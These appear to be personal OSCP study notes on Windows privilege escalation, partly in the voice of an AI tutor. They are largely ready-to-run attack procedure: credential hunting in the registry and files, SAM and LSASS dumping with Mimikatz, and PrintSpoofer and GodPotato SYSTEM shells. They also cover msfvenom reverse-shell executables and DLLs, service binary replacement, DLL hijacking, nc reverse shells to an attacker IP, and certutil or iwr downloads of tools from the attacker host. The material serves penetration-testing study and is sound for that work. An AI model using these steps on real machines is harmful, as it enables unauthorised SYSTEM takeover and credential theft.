# Module 17 Windows Privilege Escalation

**Windows Privilege Escalation — Systematic Methodology**

**Phase 1 — Automated scan first:**
```cmd
# Transfer WinPEAS to target, then run
winpeas.exe > output.txt

# Or the batch version if .exe is blocked
winpeas.bat
```
Focus on RED highlights first — near-confirmed vectors.

**Phase 2 — Manual checks in priority order:**

**1. Who am I and what privileges:**
```cmd
whoami /priv           # check for SeImpersonate, SeBackup, etc.
whoami /groups         # group memberships
whoami /all            # everything
```
If you see `SeImpersonatePrivilege` → Potato attack.
If you see `SeBackupPrivilege` → can read any file including SAM.

**2. System information:**
```cmd
systeminfo             # OS version, patches, architecture
hostname
```
Note the OS build and hotfixes — for kernel exploits.

**3. Users and groups:**
```cmd
net user               # list local users
net user <username>    # details on specific user
net localgroup administrators   # who's admin
```

**4. Stored credentials:**
```cmd
cmdkey /list                          # saved credentials
reg query HKLM /f password /t REG_SZ /s   # registry passwords
dir /s *pass* == *.config              # config files
findstr /si password *.xml *.ini *.txt # search files for passwords
```

**5. AlwaysInstallElevated (instant SYSTEM if enabled):**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both return `0x1` → generate malicious MSI with msfvenom → runs as SYSTEM.

**6. Service vulnerabilities:**
```cmd
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Weak service permissions (need accesschk.exe)
accesschk.exe /accepteula -uwcqv <username> *
```

**7. Scheduled tasks:**
```cmd
schtasks /query /fo LIST /v | findstr /i "task to run\|run as user"
```
Look for tasks running as SYSTEM with a script you can modify.

**8. Running processes and services:**
```cmd
tasklist /svc
wmic service list brief
```

**9. Network / internal services:**
```cmd
netstat -ano            # listening ports, internal services
ipconfig /all
```

**10. Patch level for kernel exploits:**
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo             # feed into Windows Exploit Suggester
```

**The decision tree:**

```
Run WinPEAS
  ↓
whoami /priv → SeImpersonate? → Potato attack → SYSTEM
  ↓
AlwaysInstallElevated = 1? → malicious MSI → SYSTEM
  ↓
Stored credentials found? → use them / PtH
  ↓
Weak service permissions? → replace binpath → SYSTEM
  ↓
Unquoted service path + writable dir? → plant exe → SYSTEM
  ↓
Scheduled task as SYSTEM + writable script? → inject payload
  ↓
Nothing? → kernel exploit (Windows Exploit Suggester)
```

**Key privileges and their exploits:**

| Privilege | Exploit |
|-----------|---------|
| SeImpersonatePrivilege | PrintSpoofer / GodPotato |
| SeBackupPrivilege | Read SAM/SYSTEM, dump hashes |
| SeRestorePrivilege | Overwrite system files |
| SeTakeOwnershipPrivilege | Take ownership of any file |
| SeDebugPrivilege | Dump LSASS with Mimikatz |

**Credential dumping once you have SYSTEM:**
```cmd
# From SAM (local accounts)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# Then on Kali:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Or Mimikatz for logged-in credentials
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Tools to have ready:**
- `winPEAS.exe` — automated enumeration
- `accesschk.exe` — check service/file permissions
- `PrintSpoofer.exe` / `GodPotato.exe` — SeImpersonate exploits
- `mimikatz.exe` — credential dumping
- Windows Exploit Suggester — kernel exploit matching

**File transfer to Windows target:**
```cmd
# On Kali
python3 -m http.server 80

# On Windows target
certutil -urlcache -f http://YOUR_IP/winpeas.exe winpeas.exe
# or PowerShell
powershell wget http://YOUR_IP/winpeas.exe -OutFile winpeas.exe
```

**One-sentence methodology:**
Run WinPEAS, check `whoami /priv` for exploitable privileges (especially SeImpersonate), check AlwaysInstallElevated and stored credentials, then service misconfigurations, and fall back to kernel exploits last.

### Reference

**LOLBAS** (Living Off The Land Binaries And Scripts)
The direct Windows equivalent of GTFOBins. Catalogs legitimate Windows binaries that can be abused.
```
https://lolbas-project.github.io/
```

**For SeImpersonate and token privileges specifically:**
The Potato attack family isn't on LOLBAS — those are separate tools:
- PrintSpoofer
- GodPotato
- JuicyPotato
- SweetPotato

**Other essential Windows privesc references:**

**HackTricks — Windows Local Privilege Escalation**
The most comprehensive checklist and technique reference. This is the one most people actually use:
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
```

**PayloadsAllTheThings — Windows Privilege Escalation**
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
```

**Quick reference for what each covers:**

| Site | Best for |
|------|----------|
| LOLBAS | Abusing legit Windows binaries |
| HackTricks | Complete privesc methodology & checklist |
| PayloadsAllTheThings | Commands and techniques reference |

**For OSCP practically:**
HackTricks is your GTFOBins equivalent for Windows — it has the checklist, the techniques, and the exact commands. Bookmark it. When WinPEAS finds something and you don't know how to exploit it, HackTricks Windows privesc page has the method.

**The mapping:**
- Linux privesc stuck? → GTFOBins + HackTricks Linux
- Windows privesc stuck? → LOLBAS + HackTricks Windows

Bookmark HackTricks Windows Local Privilege Escalation specifically — it's the single most useful page for this module and the exam.

---


## 17.1.2 Situational Awareness

```powershell
#Gets processes with name and path to it
Get-Process | Select-Object Name, Path
```

Or for more detail:
```powershell
Get-CimInstance Win32_Process | Select-Object Name, ExecutablePath
```

```powershell
#Only non-standard process
Get-CimInstance Win32_Process | Select-Object Name, ExecutablePath | Where-Object { $_.ExecutablePath -notlike "C:\Windows\*" -and $_.ExecutablePath -notlike "C:\Program Files*" -and $_.ExecutablePath -ne $null }
```

**What makes a process "non-standard":**

Standard Windows processes run from:
```
C:\Windows\System32\
C:\Windows\
C:\Program Files\
C:\Program Files (x86)\
```

A **non-standard** process runs from an unusual location like:
```
C:\Users\<user>\
C:\Temp\
C:\SomeCustomFolder\
```

---

## 17.1.3 Hidden in plain view

**Manual File Search**
> WinPEAS does NOT find these.
```bash
# Search common document types across all user folders
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xml,*.ini,*.config,*.log,*.kdbx -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# Public folder — often used to stash things
Get-ChildItem -Path C:\Users\Public\ -Recurse -ErrorAction SilentlyContinue

# mac's own Documents/Desktop/Downloads
Get-ChildItem -Path C:\Users\mac\ -Include *.txt,*.pdf,*.xml -File -Recurse -ErrorAction SilentlyContinue
```

---

## 17.1.4 Information Goldmine Powershell 

`(Get-PSReadlineOption).HistorySavePath` shows the location of the PowerShell history file — the equivalent of Linux's .bash_history.

```powershell
#Viewing powershell history
Get-Content (Get-PSReadlineOption).HistorySavePath
```

---

### runas vs Enter-PSSession

Good question — both let you run things as a different user, but they work very differently.

**runas:**
Runs a program as a **different user on the same local machine**. You provide credentials, and it launches a process as that user.

```cmd
runas /user:roy cmd.exe
```

This opens a new cmd window running as `roy` (you'll be prompted for roy's password). Everything stays local — you're just switching user context on the machine you're already on.

Think of it as the Windows equivalent of Linux's `su`.

**Enter-PSSession:**
Opens an **interactive PowerShell session on a remote machine** over the network (via WinRM, port 5985/5986).

```powershell
Enter-PSSession -ComputerName 192.168.1.10 -Credential roy
```

This connects you to a *different machine* and gives you a PowerShell prompt there. It's remote access, like SSH.

Think of it as the Windows equivalent of `ssh user@remotehost`.

**The key distinction:**

| | runas | Enter-PSSession |
|---|-------|-----------------|
| Where it runs | Same local machine | Remote machine over network |
| Purpose | Switch user locally | Remote shell |
| Linux equivalent | `su` | `ssh` |
| Protocol | Local | WinRM (5985/5986) |

**For OSCP:**

- Use **runas** when you found credentials for another user on the box you're already on, and want to run something as them locally.
- Use **Enter-PSSession** when you found credentials and want to access a *different* machine remotely — common in AD lateral movement.

There's also **evil-winrm** from Kali which does the same thing as Enter-PSSession but from your attacker machine:
```bash
evil-winrm -i <target> -u roy -p password
```

This is what you'll actually use most on OSCP to get a shell on a Windows box once you have credentials.


---


## PowerUp.ps1

```powershell
. .\powerup.ps1        # loads silently - no output expected
Invoke-AllChecks       # THIS runs the checks and produces output
```

---


## SeImperonate Privilege escalation

**SeImpersonate → SYSTEM via PrintSpoofer**

**Step 1 — Transfer PrintSpoofer to the target:**

On Kali:
```bash
# Download PrintSpoofer if you don't have it
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

On target:
```powershell
iwr -Uri http://YOUR_KALI_IP/PrintSpoofer64.exe -OutFile C:\Users\dave\PrintSpoofer64.exe
```

**Step 2 — Run PrintSpoofer to get a SYSTEM shell:**

Interactive shell in current window:
```cmd
.\PrintSpoofer64.exe -i -c cmd
```

Or spawn a SYSTEM command prompt:
```cmd
.\PrintSpoofer64.exe -c "cmd /c whoami"
```

**Step 3 — Verify you're SYSTEM:**
```cmd
whoami
# Should return: nt authority\system
```

**If you want a reverse shell as SYSTEM instead:**

Set up listener on Kali:
```bash
nc -lnvp 443
```

Then on target, use PrintSpoofer to trigger a reverse shell:
```cmd
.\PrintSpoofer64.exe -c "nc64.exe YOUR_KALI_IP 443 -e cmd"
```
(requires nc64.exe transferred to target)

Or with a PowerShell reverse shell:
```cmd
.\PrintSpoofer64.exe -c "powershell -e <base64_payload>"
```

**If PrintSpoofer fails, use GodPotato instead:**
```cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

#powershell + reverse shell
.\GodPotato.exe -cmd "powershell -e <base64_payload>"
```

GodPotato works on more modern Windows versions where PrintSpoofer sometimes fails.

**The whole flow:**
```
SeImpersonate enabled
  ↓
Transfer PrintSpoofer64.exe
  ↓
.\PrintSpoofer64.exe -i -c cmd
  ↓
whoami → nt authority\system
  ↓
Get the flag / dump credentials
```



## Weak Service Binary Permission Privilege escalation

**First — finding the right service in PowerUp output:**

Run:
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

Look for a section titled **"Modifiable Services"** or **"Modifiable Service Files"**. It looks like this:

```
ServiceName    : SomeService
Path           : C:\Path\To\service.exe
ModifiablePath : @{ModifiablePath=C:\Path\To\service.exe; ...}
StartName      : ...
AbuseFunction  : Install-ServiceBinary -Name 'SomeService'
```

The key is a service where **milena can write to the service's .exe file**. That's the "Modifiable Service File" — you can overwrite the binary the service runs.

**What service does PowerUp show as modifiable?** Paste that section and I'll confirm.

**Now — how to replace the binary:**

The concept: the service runs a specific `.exe`. If you can write to that `.exe`'s location, you replace it with your own malicious `.exe`. When the service restarts, Windows runs YOUR exe as the service's user (often SYSTEM or a privileged user like roy).

**Step-by-step:**

**1. Generate a malicious binary with msfvenom (on Kali):**
```bash
# 64-bits (modern and common)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe -o malicious.exe

# 32-bit (rare)
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o malicious.exe
```

**2. Transfer it to the target:**
```powershell
wget http://YOUR_IP/malicious.exe -O C:\Path\To\malicious.exe
```

**3. Back up the original and replace it:**
```powershell
# Rename the original service binary
move "C:\Path\To\service.exe" "C:\Path\To\service.exe.bak"

# Put your malicious binary in its place with the original name
move "C:\Path\To\malicious.exe" "C:\Path\To\service.exe"
```

**4. Set up your listener on Kali:**
```bash
nc -lnvp 443
```

**5. Restart the service to trigger your binary:**
```powershell
Restart-Service -Name "ServiceName"
# Or if that fails:
sc stop ServiceName
sc start ServiceName
```

**Conditions for exploiting weak service binary permissions:**

**1. Write access to the service binary**
You need permission to overwrite the `.exe` file that the service runs. Check with:
```cmd
icacls "C:\Path\To\service.exe"
```
Look for your user having `(W)`, `(M)`, or `(F)` — write, modify, or full control.

**2. Ability to restart the service (or a reboot happens)**
Your malicious binary only executes when the service **starts**. You need either:
- Permission to restart the service yourself:
```cmd
sc stop ServiceName
sc start ServiceName
```
- OR the machine reboots (less reliable, you can't control it)

Check if you can restart:
```powershell
# If this works without access denied, you can restart it
Restart-Service -Name "ServiceName"
```

**3. The service runs as a privileged user**
The point of the attack is escalation. The service should run as SYSTEM or a higher-privileged user than you. Check:
```cmd
sc qc ServiceName
```
Look at `SERVICE_START_NAME` — if it's `LocalSystem` or a privileged account, exploiting it escalates you.

**The three conditions together:**
```
Writable service .exe  +  Can restart service  +  Service runs as privileged user
= Privilege escalation
```

**PowerUp identifies these automatically** under "Modifiable Services" (you can change the config) and "Modifiable Service Files" (you can overwrite the binary).

---

## DLL Hijacking

**The concept:**
When a program runs, it loads DLL files (libraries). If the program looks for a DLL that doesn't exist, or searches directories in a specific order, you can plant a malicious DLL that gets loaded instead. Your DLL runs with the privileges of the program that loads it.

**Conditions needed:**
1. A program/service running as a privileged user (SYSTEM or admin)
2. The program loads a DLL that's **missing**, OR searches a directory you can **write to** before finding the real DLL
3. You can restart the program/service (or it runs on a schedule/reboot)

**Step-by-step:**

**1. Identify a vulnerable DLL load**

Use PowerUp:
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
# Look for "DLL Hijacking" findings
```

Or use Process Monitor (procmon) to watch for `NAME NOT FOUND` results on DLL loads — these are DLLs the program looks for but can't find. Filter procmon for:
- Result: `NAME NOT FOUND`
- Path ends in `.dll`

**2. Identify a writable directory in the search path**

The DLL must be planted somewhere the program searches AND you can write to:
```cmd
icacls "C:\Path\To\Directory"
# Look for (W) or (F) for your user
```

**3. Generate a malicious DLL**

On Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f dll -o malicious.dll
```

**4. Name it correctly and place it**

Rename your DLL to the exact name the program is looking for:
```powershell
# The program looks for "hijackme.dll"
move malicious.dll C:\WritableDir\hijackme.dll
```

**5. Set up listener:**
```bash
nc -lnvp 443
```

**6. Trigger the DLL load**

Restart the service or application that loads the DLL:
```powershell
Restart-Service -Name "VulnerableService"
```

When it starts, it loads your malicious DLL, executing your payload as the service's user..

**The two main scenarios:**

**Missing DLL:**
The program looks for a DLL that doesn't exist anywhere. You plant yours where it searches. Easiest to exploit.

**DLL search order hijacking:**
The real DLL exists, but you place yours in a directory searched earlier. Yours loads first.

**How to find missing DLLs (Procmon method):**
```
1. Run Procmon on a system where you can observe the target program
2. Filter: Process Name = target.exe
3. Filter: Result = NAME NOT FOUND
4. Filter: Path ends with .dll
5. Any result = a DLL the program wants but can't find = hijack target
```

**Comparison to other service attacks:**

| Attack | What you exploit |
|--------|-----------------|
| Weak service binary | Overwrite the service's .exe directly |
| Unquoted service path | Plant exe in a path with spaces |
| DLL hijacking | Plant a malicious DLL the program loads |

All three end with your code running as the service's privileged user.

**Reliability note for OSCP:**
DLL hijacking is often less reliable than the other methods and harder to identify without Procmon. PowerUp's DLL hijack findings (like the `wlbsctrl.dll` one you saw earlier) are frequently false positives. Try weak service binaries and unquoted paths first — DLL hijacking is usually a later resort.

**One-sentence summary:**
Find a privileged program that loads a missing or hijackable DLL from a directory you can write to, plant your malicious DLL with the right name, restart the program, and your code runs with its privileges.

### Procmon, determining which service to restart

**How you determine a DLL hijack target (the methodology):**

You use **Procmon** (Process Monitor) to watch what DLLs an application tries to load and which ones it fails to find:

1. Run Procmon
2. Set filters:
   - `Process Name is filezilla.exe`
   - `Result is NAME NOT FOUND`
   - `Path ends with .dll`
3. Start/run FileZilla
4. Any `NAME NOT FOUND` `.dll` result = a DLL FileZilla wants but can't find = your hijack target

The DLL it's looking for but can't find, in a directory you can write to, is what you replace with your malicious DLL.

**How to determine the vulnerable service**

The service is "vulnerable" when BOTH are true:

1. The service's binary runs from a directory you can write to
2. The service runs as a privileged user (SYSTEM/admin)

```powershell
# List all services with their binary paths and the account they run as
Get-CimInstance win32_service | Select-Object Name, PathName, StartName

#Check for (W),(M),(F) -- writable directory
icacls "C:\Path\To\ServiceDirectory"
```


### Realistic DLL hijacking methodology without admin/Procmon

**Step 1 — Find writable directories in application paths**

You're looking for application folders you can write to. WinPEAS and PowerUp check some of this, but manually:

```powershell
# Check permissions on installed application directories
Get-ChildItem "C:\Program Files\", "C:\Program Files (x86)\" -Directory | ForEach-Object {
    icacls $_.FullName 2>$null | Select-String "steve|Users|Everyone|BUILTIN"
}
```

Look for any application directory where your user has write access.

**Step 2 — Identify what runs from that writable directory**

Once you find a writable application folder, determine if it runs as a service or scheduled task with higher privileges:

```powershell
# Check services and their binary paths
Get-CimInstance win32_service | Select-Object Name, PathName, StartName | Format-Table -AutoSize

# Match service paths against your writable directory
```

If a service's `PathName` points into a directory you can write to, that service loads DLLs from there.

**Step 3 — Determine which DLL to hijack (without Procmon)**

Without Procmon, you use these approaches:
- **Known DLL hijacks** — many applications have documented hijackable DLLs. Search: "`<application name>` dll hijacking"
- **Check the app's directory** for existing DLLs — a missing common dependency is a candidate
- **DLLs referenced but not present** — compare what the exe imports vs what's in its folder

**Step 4 — Check if you can restart the service**

```powershell
# Can you restart it?
Restart-Service -Name "ServiceName" -ErrorAction SilentlyContinue

# Or check the service start type - does it start on boot?
Get-Service "ServiceName" | Select-Object Name, StartType
```

If it's `Automatic`, a reboot triggers it. If you can restart it directly, even better.

**The realistic exam approach:**

```
1. WinPEAS/PowerUp → find writable service directories or application folders
2. Identify a service running from that writable location as SYSTEM/admin
3. Search "that application dll hijacking" for known vulnerable DLLs
4. Confirm you can restart the service (or it auto-starts on boot)
5. Plant malicious DLL with the correct name
6. Restart/trigger → shell as the service's user
```

**The honest truth about DLL hijacking on OSCP:**

It's one of the **less common** privesc paths on the exam precisely because it often needs Procmon or specific knowledge. The exam favors more reliable paths:
- SeImpersonate (Potato)
- Weak service permissions
- Unquoted service paths
- Stored credentials
- AlwaysInstallElevated


**The key signal for a DLL hijack opportunity:**
A **service running as SYSTEM** whose **binary lives in a directory you can write to**. That's when you check for hijackable DLLs. If the service binary is in a protected directory, DLL hijacking usually isn't the path.

Does that give you a realistic approach for identifying DLL hijack targets without admin?


